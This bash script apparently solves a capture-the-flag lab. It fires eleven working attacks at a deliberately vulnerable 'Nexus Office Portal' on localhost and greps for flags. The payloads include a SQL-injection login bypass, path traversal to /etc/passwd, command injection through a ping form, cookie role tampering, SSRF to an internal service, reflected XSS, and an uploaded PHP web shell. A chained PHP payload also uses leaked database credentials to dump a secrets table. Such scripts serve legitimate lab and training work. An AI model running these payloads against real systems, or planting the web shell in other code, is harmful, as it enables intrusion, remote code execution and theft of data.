#!/usr/bin/env bash
# Nexus Office Portal - reproduce all 11 findings
# Target: http://localhost:8080
# Usage: bash scripts/reproduce_all.sh
set -u

TARGET="http://localhost:8080"
COOKIE_JAR="/tmp/nexus_cookies.txt"
rm -f "$COOKIE_JAR"

echo "=== Step 0: obtain a session (SQLi auth bypass first) ==="
for i in $(seq 1 20); do
  LOGIN=$(curl -s -c "$COOKIE_JAR" -X POST "$TARGET/login.php" \
    --data-urlencode "username=admin' OR '1'='1' -- " \
    --data-urlencode "password=x")
  if grep -q PHPSESSID "$COOKIE_JAR" 2>/dev/null; then break; fi
  sleep 2
done
echo "$LOGIN" | grep -oE "FLAG\{[^}]*\}" || echo "no flag in login response"
SID=$(grep PHPSESSID "$COOKIE_JAR" | awk '{print $NF}')

echo
echo "=== 1. LFI - read /etc/passwd (flag in last pseudo-user) ==="
curl -s -b "$COOKIE_JAR" "$TARGET/view.php?page=../../../../etc/passwd" | grep -oE "FLAG\{[^}]*\}|viewer_flag|root:"

echo
echo "=== 2. Command injection - read secret file ==="
curl -s -b "$COOKIE_JAR" -X POST "$TARGET/ping.php" \
  --data "ip=127.0.0.1; cat /var/nexus_secret.txt" | grep -oE "FLAG\{[^}]*\}"

echo
echo "=== 3. SQLi auth bypass (flag shown on login) ==="
echo "$LOGIN" | grep -oE "FLAG\{[^}]*\}"

echo
echo "=== 4. IDOR - confidential invoice #1 ==="
curl -s -b "$COOKIE_JAR" "$TARGET/invoice.php?id=1" | grep -oE "FLAG\{[^}]*\}|CEO"

echo
echo "=== 5. Cookie privilege escalation ==="
curl -s -H "Cookie: PHPSESSID=$SID; role=superuser" "$TARGET/profile.php" | grep -oE "FLAG\{[^}]*\}|superuser"

echo
echo "=== 6. Unrestricted file upload RCE ==="
printf '<?php echo shell_exec($_GET["cmd"]); ?>' > /tmp/nexus_shell.php
curl -s -b "$COOKIE_JAR" -F "avatar=@/tmp/nexus_shell.php" "$TARGET/upload.php" | grep -oE "FLAG\{[^}]*\}"
echo "  shell check:"
curl -s -b "$COOKIE_JAR" "$TARGET/uploads/nexus_shell.php?cmd=id"
rm -f /tmp/nexus_shell.php

echo
echo "=== 7. SSRF to internal microservice ==="
curl -s -b "$COOKIE_JAR" -X POST "$TARGET/fetch.php" \
  --data "url=http://internal-api:8000/api" | grep -oE "FLAG\{[^}]*\}"

echo
echo "=== 8. Backup file credential leak ==="
curl -s "$TARGET/admin_portal_backup/config.php.bak" | grep -oE "FLAG\{[^}]*\}|db_pass|db_user"

echo
echo "=== 9. robots.txt disclosure ==="
curl -s "$TARGET/robots.txt" | grep -oE "FLAG\{[^}]*\}|Disallow"

echo
echo "=== 10. Reflected XSS (script tag reflected unencoded) ==="
curl -s -b "$COOKIE_JAR" "$TARGET/invoice.php?id=%3Cscript%3Ealert(1)%3C/script%3E" | grep -oE "Invoice #[^<]*<script>"

echo
echo "=== 11. Database master flag (chain: leaked creds + PHP shell) ==="
printf '<?php $m=new mysqli("nexus-db","nexus_app","S3cur3P@ssw0rd!","nexus_portal");$r=$m->query("SELECT * FROM app_secrets");while($row=$r->fetch_assoc()){echo $row["flag_data"];} ?>' > /tmp/nexus_dbf.php
curl -s -b "$COOKIE_JAR" -F "avatar=@/tmp/nexus_dbf.php" "$TARGET/upload.php" > /dev/null
curl -s -b "$COOKIE_JAR" "$TARGET/uploads/nexus_dbf.php"
rm -f /tmp/nexus_dbf.php

echo
echo "=== Done ==="
rm -f "$COOKIE_JAR"